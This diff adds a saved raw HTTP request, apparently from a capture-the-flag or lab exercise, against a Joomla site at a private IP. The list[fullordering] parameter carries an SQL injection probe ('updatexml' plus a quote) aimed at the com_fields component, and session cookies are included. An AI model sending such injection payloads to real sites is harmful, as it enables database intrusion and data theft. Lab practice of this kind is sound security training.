@@ -1,0 +1,12 @@
+GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27 HTTP/1.1
+Host: 10.10.43.116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: eaa83fe8b963ab08ce9ab7d4a798de05=k1kl8prllg3i4081elnrrcpum6; 2b01af51830ca9615359108de04d9ca1=7ed11ob1iuff9jgemhl3ve96n4
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+
